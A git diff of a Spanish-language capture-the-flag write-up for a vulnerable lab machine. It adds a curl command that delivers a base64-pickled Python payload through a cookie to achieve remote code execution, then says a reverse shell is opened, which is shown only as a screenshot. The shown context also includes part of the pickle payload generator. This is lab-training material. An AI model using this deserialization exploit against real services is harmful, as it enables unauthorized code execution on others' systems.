@@ -100,8 +100,18 @@ La máquina **Pickle Rick** es una máquina virtual vulnerable de la plataforma 
   print base64.b64encode(cPickle.dumps(PickleRce()))
   ```
 
-  Este codigo ya es suficiente para poder conseguir un **RCE** en la maquina victima.
+  Este codigo ya es suficiente para poder conseguir un **RCE** en la maquina victima, esto se haria usando curl y seria de la siguiente forma.
+
+  ```bash
+curl -X GET "http://[Ip Machine]:5003/search" -H 'Cookie: search_cookie="[Data Serializada]"'
+  ```
 
   <p align="center">
-  <img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/THM/UbaketPie/scan/pickle.png?raw=true">
+  <img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/THM/UbaketPie/intrusion/pickle.png?raw=true">
+  </p>
+
+  Ya sabiendo que podemos ejecutar comando nos entablarnos una shell a nuestro equipo.
+
+  <p align="center">
+  <img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/THM/UbaketPie/intrusion/shell.png?raw=true">
   </p>
